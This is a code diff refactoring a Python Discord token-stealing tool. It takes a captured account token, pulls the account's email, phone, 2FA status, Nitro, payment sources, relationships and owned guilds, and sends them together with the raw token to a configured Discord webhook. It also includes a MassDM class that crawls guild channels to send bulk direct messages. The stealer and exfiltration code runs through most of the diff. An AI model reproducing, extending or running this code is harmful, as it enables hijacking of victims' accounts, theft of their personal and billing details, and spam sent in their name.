@@ -1,4 +1,7 @@
-from discord_webhook import AsyncDiscordWebhook, DiscordEmbed
+# from discord_webhook import AsyncDiscordWebhook, DiscordEmbed
+from http.client import HTTPException
+from discord import NotFound, Webhook, Embed
+import discord
 import config
 import asyncio
 from colorama import Fore
@@ -34,13 +37,15 @@ async def get_guilds(token):
     
 async def get_payment(token):
     async with aiohttp.request("GET", "https://discordapp.com/api/users/@me/billing/payment-sources", headers=await get_headers(token)) as resp:
-        data = await resp.json()
-        if data:
-            for pm in data:
-                if 'invalid' in pm: #if there is invalid a pm exists
-                    if pm['invalid'] == False: 
-                        return True
-        return False
+        return await resp.json()
+
+async def parse_payment(payment):
+    if payment:
+        for pm in payment:
+            if 'invalid' in pm: #if there is invalid a pm exists
+                if pm['invalid'] == False: 
+                    return True
+    return False   
 
 
 async def capture_owned_guilds(guilds):
@@ -50,51 +55,45 @@ async def capture_owned_guilds(guilds):
             owned_guilds.append(guild)
     return owned_guilds
 
-async def generate_embed(token, logged_from):
-    details = await get_details(token)
-
-    if "premium_type" in details:
-        if details['premium_type'] == 1:
-            nitro = "Classic"
-        elif details['premium_type'] == 2:
-            nitro = True
-    else:
-        nitro = False
-        
-        
-    guilds = await get_guilds(token)
-
+async def generate_embed(user):
+    guilds = await get_guilds(user.token)
     owned_guilds = await capture_owned_guilds(guilds)
     
-    embed = DiscordEmbed()
+    embed = Embed()
 
+    embed.set_author(name=f"{user.details['username']}#{user.details['discriminator']}:{user.details['id']}", icon_url=f"https://cdn.discordapp.com/avatars/{user.details['id']}/{user.details['avatar']}.webp?size=128")
+    embed.add_field(name='Token',         value=user.token, inline=False)
+    embed.add_field(name='Email',         value=user.email, inline=False)
+    embed.add_field(name='Phone',         value=user.phone, inline=False)
+    embed.add_field(name='2FA',           value=user.details["mfa_enabled"])
+    embed.add_field(name='Nitro',         value=user.nitro)
+    embed.add_field(name='Billing',       value=user.valid_payment)
+    embed.add_field(name='Relationships', value=await get_relationships(user.token))
+    embed.add_field(name='Guilds',        value=len(guilds))
+    embed.add_field(name='Owned Guilds',  value=len(owned_guilds))
 
-
-    embed.set_author(name=f"{details['username']}#{details['discriminator']}:{details['id']}", icon_url=f"https://cdn.discordapp.com/avatars/{details['id']}/{details['avatar']}.webp?size=128")
-    embed.add_embed_field(name='Token',         value=token, inline=False)
-    embed.add_embed_field(name='Email',         value=details['email'], inline=False)
-    embed.add_embed_field(name='Phone',         value=details['phone'], inline=False)
-    embed.add_embed_field(name='2FA',           value=details["mfa_enabled"])
-    embed.add_embed_field(name='Nitro',         value=nitro)
-    embed.add_embed_field(name='Billing',       value=await get_payment(token))
-    embed.add_embed_field(name='Relationships', value=await get_relationships(token))
-    embed.add_embed_field(name='Guilds',        value=len(guilds))
-    embed.add_embed_field(name='Owned Guilds',  value=len(owned_guilds))
-
-    embed.set_footer(text=f"screen: [{config.screensess}] server: [{logged_from}]")
-    for owned in owned_guilds:
-        embed.add_embed_field(name=owned['name'], value=f"{owned['approximate_member_count']} Members", inline=False)
+    embed.set_footer(text=f"screen: [{config.screensess}] server: [{user.logged_from}]")
+    for guild in owned_guilds:
+        pass
+        # embed.add_embed_field(name=guild['name'], value=f"{guild['approximate_member_count']} Members", inline=False)
     return embed
 
 
-async def send_webhook(token, logged_from):
-    webhook = AsyncDiscordWebhook(url=config.config["webhook_url"])
-    
-    webhook.add_embed(await generate_embed(token, logged_from))
-    try:
-        await webhook.execute()
-    except Exception:
-        print('Failed to send webhook')
+async def send_webhook(user):
+    async with aiohttp.ClientSession() as session:  
+
+        webhook = Webhook.from_url(config.config["webhook_url"], session=session)
+        embed = await generate_embed(user)
+        try:
+            await webhook.send(embed=embed)
+        except HTTPException:
+            print(f'{Fore.RED}[Error] HTTPException Failed to send to webhook.')
+        except NotFound:
+            print(f'{Fore.RED}[Error] Notfound Failed to send to webhook.')
+        except TypeError:
+            print(f'{Fore.RED}[Error] TypeError Failed to send to webhook.')
+
+
 
 async def send_friend_request(token, user):
     payload = {
@@ -105,32 +104,6 @@ async def send_friend_request(token, user):
         pass
 
 
-    
-async def get_guilds(self):
-    async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/guilds", headers=self.headers) as resp:
-        return await resp.json()
-
-async def get_guild_channels(self, guild_id):
-    async with aiohttp.request("GET", f"https://discordapp.com/api/guilds/{guild_id}/channels", headers=self.headers) as resp:
-        return await resp.json()
-
-
-async def get_dms(self):
-    async with aiohttp.request("GET", f"https://discord.com/api/v8/users/@me/channels", headers=self.headers) as resp:
-        return await resp.json()
-
-
-async def get_relationships(self):
-    async with aiohttp.request("GET", f"https://discordapp.com/api/v6/users/@me/relationships", headers=self.headers) as resp:
-        return await resp.json()
-    
-async def update_status(self, message):
-    payload = {
-        "bio": message
-    }       
-    async with aiohttp.request("PATCH", f"https://discord.com/api/v9/users/@me", json=payload, headers=self.headers) as resp:
-        return await resp.json()
-
 class MassDM:
     async def init(self, token, name):
         self.token = token
@@ -139,7 +112,30 @@ class MassDM:
         self.msg_index = 0
 
     
- 
+    async def get_guilds(self):
+        async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/guilds", headers=self.headers) as resp:
+            return await resp.json()
+
+    async def get_guild_channels(self, guild_id):
+        async with aiohttp.request("GET", f"https://discordapp.com/api/guilds/{guild_id}/channels", headers=self.headers) as resp:
+            return await resp.json()
+
+
+    async def get_dms(self):
+        async with aiohttp.request("GET", f"https://discord.com/api/v8/users/@me/channels", headers=self.headers) as resp:
+            return await resp.json()
+
+
+    async def get_relationships(self):
+        async with aiohttp.request("GET", f"https://discordapp.com/api/v6/users/@me/relationships", headers=self.headers) as resp:
+            return await resp.json()
+        
+    async def update_status(self, message):
+        payload = {
+            "bio": message
+        }       
+        async with aiohttp.request("PATCH", f"https://discord.com/api/v9/users/@me", json=payload, headers=self.headers) as resp:
+            return await resp.json()
 
 
     
@@ -264,6 +260,5 @@ class MassDM:
                         return
                     print(f'{Fore.BLUE}[MassDM] [USER:{self.name}] [GUILD:{guild["name"]}] [CHANNEL:{channel["name"]}]')
 
-    
-
+                    
         
